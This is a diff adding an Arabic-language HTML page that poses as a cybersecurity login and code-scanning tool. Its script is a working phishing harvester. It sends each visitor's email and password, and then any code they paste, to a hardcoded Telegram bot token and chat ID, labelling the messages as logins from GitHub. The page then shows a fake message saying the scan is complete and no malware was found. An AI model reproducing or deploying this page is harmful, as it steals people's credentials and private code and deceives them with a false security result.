@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ نظام جواد للأمن السيبراني</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
+        textarea { color: #39ff14; font-family: monospace; }
+        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background: #2ea043; }
+        h2 { color: #58a6ff; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+    <h2>🛡️ دخول النظام</h2>
+    <p>يرجى تسجيل الدخول للبدء</p>
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button onclick="sendLogin()">دخول</button>
+</div>
+
+<script>
+    const BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04";
+    const CHAT_ID = "8270719098";
+
+    async function sendLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const message = `🔑 دخول جديد من GitHub:\n📧 ${email}\n🔑 ${pass}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        
+        // تغيير محتوى الصفحة بعد الدخول
+        document.getElementById('mainCard').innerHTML = `
+            <h2>🛡️ فحص الحماية</h2>
+            <p>أدخل الكود لتحليله</p>
+            <textarea id="codeToScan" placeholder="الصق الكود هنا..." rows="5"></textarea>
+            <button onclick="sendScan()">بدء الفحص 🔍</button>
+        `;
+    }
+
+    async function sendScan() {
+        const content = document.getElementById('codeToScan').value;
+        const message = `🔍 محتوى مفحوص من GitHub:\n${content}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        
+        alert("✅ اكتمل الفحص! لم يتم العثور على برمجيات خبيثة.");
+    }
+</script>
+
+</body>
+</html>
